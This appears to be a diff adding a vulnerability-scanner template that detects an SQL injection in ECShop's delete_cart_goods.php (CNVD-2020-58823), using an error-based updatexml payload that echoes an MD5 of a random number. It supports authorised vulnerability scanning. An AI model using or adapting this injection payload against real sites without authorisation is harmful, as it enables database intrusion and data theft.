@@ -1,0 +1,33 @@
+id: poc-local-xray-ecshop-cnvd-2020-58823-sqli
+
+info:
+  name: poc-local-xray-ecshop-cnvd-2020-58823-sqli
+  author: capiton
+  severity: high
+  reference:
+    - https://mp.weixin.qq.com/s/1t0uglZNoZERMQpXVVjIPw
+  tags: ecshop
+
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+
+
+requests:
+  - method: POST
+    path:
+      - "{{RootURL}}/delete_cart_goods.php"
+    body: "id=0||(updatexml(1,concat(0x7e,(select%20md5({{r1}})),0x7e),1))"
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains(body,substr(md5("{{r1}}"), 0, 31))
+        condition: and
+
+      - type: status
+        status:
+          - 200
+        condition: and
